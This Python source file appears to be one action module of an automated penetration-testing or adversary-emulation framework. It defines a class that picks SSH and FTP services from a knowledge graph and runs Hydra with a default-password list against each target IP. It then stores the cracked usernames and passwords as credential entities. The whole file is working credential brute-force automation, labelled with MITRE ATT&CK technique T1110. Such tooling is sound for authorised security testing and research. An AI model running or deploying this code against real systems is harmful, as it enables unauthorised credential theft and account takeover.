import json
from pathlib import Path
from typing import Union

from action_state_interface.action import Action, StateChangeSequence
from action_state_interface.action_utils import shell
from action_state_interface.exec import ActionExecutionResult
from artefacts.ArtefactManager import ArtefactManager
from kg_api import Entity, GraphDB, MultiPattern, Pattern, Relationship
from Session import SessionManager


class HydraBruteForceAction(Action):
    """
    Perform a brute-force attack using Hydra on a specific service (e.g., SSH, FTP) associated with an asset.
    This action is performed against Service entities.
    """

    def __init__(self):
        super().__init__("HydraBruteForce", "T1110 Brute Force", "TA0006 Credential Access", ["quiet", "fast"])
        self.noise = 1
        self.impact = 0.8

    def expected_outcome(self, pattern: Pattern) -> list[str]:
        """
        Return expected outcome of action.
        """
        return [
            f"Gain access to {pattern.get('service').get('protocol')} service ({pattern.get('service')._id}) "
            f"on {pattern.get('asset').get('ip_address')}"
        ]

    def get_target_patterns(self, kg: GraphDB) -> list[Union[Pattern, MultiPattern]]:
        """
        Identify target patterns with Asset -> Path -> Service (selected service).
        """
        asset = Entity('Asset', alias='asset')
        service = Entity('Service', alias='service')
        pattern = asset.directed_path_to(service)
        matches = kg.get_matching(pattern)
        return [p for p in matches if p.get('service').get('protocol') in ['ftp', 'ssh']]

    def function(self, sessions: SessionManager, artefacts: ArtefactManager, pattern: Pattern) -> ActionExecutionResult:
        """
        Use Hydra to perform brute-force attack.
        """
        asset = pattern.get('asset')
        ip_address = asset.get('ip_address')
        service = pattern.get('service')
        protocol = service.get('protocol')

        if protocol not in ['ftp', 'ssh']:
            raise ValueError(f"Unsupported protocol: {protocol}")

        in_uuid = artefacts.search(f'dpl4hydra_{protocol}.lst')[0]
        password_list = artefacts.get_path(in_uuid)

        if not Path(password_list).exists():
            raise FileNotFoundError(f"Password list not found: {password_list}")

        if protocol == 'ssh':
            no_tasks = 4
        else:
            no_tasks = 16

        out_uuid = artefacts.placeholder('hydra-brute-force-output.json')
        output_path = artefacts.get_path(out_uuid)

        # Execute Hydra
        execres = shell(
            "hydra",
            [
                "-C",
                str(password_list),
                "-o",
                str(output_path),
                "-b",
                "json",
                f"-t{str(no_tasks)}",
                f"{protocol}://{ip_address}",
            ],
        )

        execres.artefacts["scan_results_json"] = out_uuid
        return execres

    def capture_state_change(
        self, kg: GraphDB, artefacts: ArtefactManager, pattern: Pattern, output: ActionExecutionResult
    ) -> StateChangeSequence:
        """
        Add successful credentials to the knowledge graph.
        """
        service = pattern.get('service')

        with artefacts.open(output.artefacts["scan_results_json"], 'r') as f:
            results = json.load(f)

        changes: StateChangeSequence = []
        for result in results.get('results', []):
            username = result.get('login')
            password = result.get('password')
            if username and password:
                creds = Entity('Credentials', alias='credentials', username=username, password=password)
                credential_service_pattern = creds.with_edge(
                    Relationship(type='secured_with', direction='r')
                ).with_node(service)
                user = Entity('User', alias='user', username=username)
                user_pattern = user.with_edge(Relationship('is_client')).with_node(service)
                changes.append((pattern, "merge_if_not_match", credential_service_pattern))
                changes.append((pattern, "merge_if_not_match", user_pattern))
        return changes
